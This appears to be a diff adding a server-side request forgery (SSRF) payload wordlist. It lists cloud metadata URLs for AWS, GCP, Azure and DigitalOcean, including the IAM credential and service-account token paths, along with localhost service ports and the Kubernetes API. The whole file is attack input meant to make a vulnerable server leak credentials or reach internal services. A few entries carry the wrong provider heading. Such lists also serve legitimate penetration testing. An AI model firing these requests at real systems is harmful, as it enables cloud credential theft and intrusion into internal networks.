@@ -1,0 +1,25 @@
+# AWS
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+# GCP
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+# Digital Ocean
+http://169.254.169.254/metadata/v1.json
+http://100.100.100.200/latest/meta-data/
+#localhost 
+http://127.0.0.1:8080
+http://127.0.0.1:8000
+http://127.0.0.1:1010
+http://127.0.0.1:3000
+http://127.0.0.1:5000
+http://127.0.0.1:9000
+http://127.0.0.1:9200
+http://127.0.0.1:6379
+http://127.0.0.1:27017
+# K8s API
+http://kubernetes.default.svc
+http://169.254.170.2/v2/credentials
